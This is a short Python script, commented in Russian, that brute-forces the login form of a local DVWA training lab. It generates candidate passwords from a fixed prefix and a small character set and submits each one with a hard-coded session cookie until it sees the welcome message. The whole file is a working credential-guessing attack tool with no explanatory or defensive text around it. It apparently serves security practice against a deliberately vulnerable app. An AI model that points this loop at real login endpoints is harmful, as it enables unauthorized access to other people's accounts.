import itertools
import requests
import time

# Настройки
url = "http://localhost/DVWA-master/vulnerabilities/brute/"
username = "admin"
charset = 'adoprsw'
password_length = 8
prefix = "pass"  # Префикс для пароля
session = requests.Session()

# Устанавливаем cookie для авторизации
session.cookies.set("PHPSESSID", "70v501t8fnf3um8jfbdo2bo9fs")
session.cookies.set("security", "low")

def generate_passwords_with_prefix(prefix, length, charset):
    """Генератор паролей фиксированной длины с указанным префиксом."""
    remaining_length = length - len(prefix)
    for combination in itertools.product(charset, repeat=remaining_length):
        yield prefix + ''.join(combination)

def try_password(url, username, password):
    """Проверка пароля."""
    params = {
        'username': username,
        'password': password,
        'Login': 'Login'
    }
    try:
        response = session.get(url, params=params)
        return "Welcome to the password protected area" in response.text
    except requests.exceptions.ConnectionError as e:
        print(f"[-] Ошибка подключения: {e}")
        return False
    except requests.exceptions.RequestException as e:
        print(f"[-] Ошибка при запросе: {e}")
        return False

def main():
    start_time = time.time()
    print("[*] Начинаем подбор пароля...")
    
    # Генерация паролей и их проверка
    for password in generate_passwords_with_prefix(prefix, password_length, charset):
        print(f"[*] Пробуем пароль: {password}")
        if try_password(url, username, password):
            print(f"[+] Пароль найден: {password}")
            break
    else:
        print("[-] Пароль не найден.")

    end_time = time.time()
    print(f"[+] Время выполнения: {end_time - start_time:.2f} секунд")

if __name__ == "__main__":
    main()
